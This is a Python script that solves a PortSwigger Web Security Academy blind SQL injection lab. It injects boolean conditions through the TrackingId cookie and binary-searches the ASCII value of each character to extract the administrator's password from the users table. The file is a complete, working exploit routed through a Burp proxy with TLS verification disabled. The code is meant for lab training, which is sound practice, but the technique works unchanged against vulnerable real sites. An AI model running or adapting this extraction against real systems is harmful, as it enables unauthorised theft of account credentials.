import os

import requests
import urllib3


# ---------------------------------------------------------
# Configuration
# ---------------------------------------------------------

# Supply these values through environment variables.
#
# Linux/macOS:
#   export LAB_URL="https://YOUR-LAB.web-security-academy.net/filter"
#   export LAB_SESSION="YOUR_CURRENT_SESSION"
#   export TRACKING_PREFIX="YOUR_TRACKING_PREFIX"
#
# Windows PowerShell:
#   $env:LAB_URL="https://YOUR-LAB.web-security-academy.net/filter"
#   $env:LAB_SESSION="YOUR_CURRENT_SESSION"
#   $env:TRACKING_PREFIX="YOUR_TRACKING_PREFIX"

LAB_URL = os.getenv("LAB_URL")
SESSION = os.getenv("LAB_SESSION")
TRACKING_PREFIX = os.getenv("TRACKING_PREFIX")

# Password character set, ordered by ASCII
ALLOWED = "0123456789abcdefghijklmnopqrstuvwxyz"

PASSWORD_LENGTH = 20

# Burp Suite proxy
PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# TLS verification:
# Original script used verify=False.
# Keep the same default behavior so Burp interception continues
# to work without requiring certificate installation.
VERIFY_TLS = os.getenv("VERIFY_TLS", "false").lower() in {
    "1",
    "true",
    "yes",
    "on",
}


# ---------------------------------------------------------
# Configuration validation
# ---------------------------------------------------------

def validate_configuration():
    """Validate required runtime configuration before starting."""

    missing = []

    if not LAB_URL:
        missing.append("LAB_URL")

    if not SESSION:
        missing.append("LAB_SESSION")

    if not TRACKING_PREFIX:
        missing.append("TRACKING_PREFIX")

    if missing:
        print("[!] Missing required environment variables:")
        for variable in missing:
            print(f"    - {variable}")

        print()
        print("[*] Example:")
        print('    export LAB_URL="https://YOUR-LAB.web-security-academy.net/filter"')
        print('    export LAB_SESSION="YOUR_CURRENT_SESSION"')
        print('    export TRACKING_PREFIX="YOUR_TRACKING_PREFIX"')

        return False

    return True


# ---------------------------------------------------------
# TLS warning handling
# ---------------------------------------------------------

if not VERIFY_TLS:
    urllib3.disable_warnings(
        urllib3.exceptions.InsecureRequestWarning
    )


# ---------------------------------------------------------
# HTTP session
# ---------------------------------------------------------

session = requests.Session()

session.proxies.update(PROXIES)

session.headers.update({
    "User-Agent": "Mozilla/5.0",
    "Accept": (
        "text/html,application/xhtml+xml,"
        "application/xml;q=0.9,*/*;q=0.8"
    ),
})


# ---------------------------------------------------------
# Send one SQL condition
# ---------------------------------------------------------

def test_condition(position, ascii_value):
    """
    Send one SQL injection condition and determine whether
    the lab response represents TRUE or FALSE.
    """

    tracking_id = (
        TRACKING_PREFIX
        + "' AND (SELECT ASCII(SUBSTRING(password,"
        + str(position)
        + ",1)) FROM users WHERE username='administrator') > "
        + str(ascii_value)
        + "-- "
    )

    try:
        response = session.get(
            LAB_URL,
            params={
                "category": "Gifts"
            },
            cookies={
                "TrackingId": tracking_id,
                "session": SESSION
            },
            verify=VERIFY_TLS,
            timeout=15
        )

    except requests.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None

    # PortSwigger lab's TRUE indicator
    return "Welcome back" in response.text


# ---------------------------------------------------------
# Binary search one character
# ---------------------------------------------------------

def find_character(position):
    """
    Determine one password character using binary search.
    """

    low = 0
    high = len(ALLOWED) - 1

    print()
    print("=" * 60)
    print(f"[*] Extracting position {position}")
    print("=" * 60)

    while low <= high:

        mid = (low + high) // 2

        character = ALLOWED[mid]
        ascii_value = ord(character)

        result = test_condition(
            position,
            ascii_value
        )

        if result is None:
            print("[!] Stopping because request failed.")
            return None

        print(
            f"[>] position={position} "
            f"test='{character}' "
            f"ASCII={ascii_value} "
            f"range={low}-{high} "
            f"=> {'TRUE' if result else 'FALSE'}"
        )

        if result:

            # Actual password character is greater than midpoint
            low = mid + 1

        else:

            # Actual password character is <= midpoint
            high = mid - 1

    # -----------------------------------------------------
    # Verify the resulting character
    # -----------------------------------------------------

    if low >= len(ALLOWED):
        print("[!] Character outside expected charset.")
        return None

    character = ALLOWED[low]

    print(
        f"[+] Position {position} = '{character}'"
    )

    return character


# ---------------------------------------------------------
# Main
# ---------------------------------------------------------

def main():

    if not validate_configuration():
        return

    password = ""

    print()
    print("=" * 60)
    print("PortSwigger Administrator Password Extraction")
    print("=" * 60)

    print(f"[*] Target: {LAB_URL}")
    print(f"[*] Length: {PASSWORD_LENGTH}")
    print(f"[*] Charset: {ALLOWED}")
    print("[*] TRUE condition: 'Welcome back'")
    print("[*] Proxy: 127.0.0.1:8080")
    print(f"[*] TLS verification: {'enabled' if VERIFY_TLS else 'disabled'}")
    print()

    for position in range(1, PASSWORD_LENGTH + 1):

        character = find_character(position)

        if character is None:
            print("[!] Extraction stopped.")
            break

        password += character

        print()
        print(
            f"[+] Password so far: {password}"
        )

    print()
    print("=" * 60)
    print(f"[+] FINAL PASSWORD: {password}")
    print("=" * 60)


if __name__ == "__main__":
    main()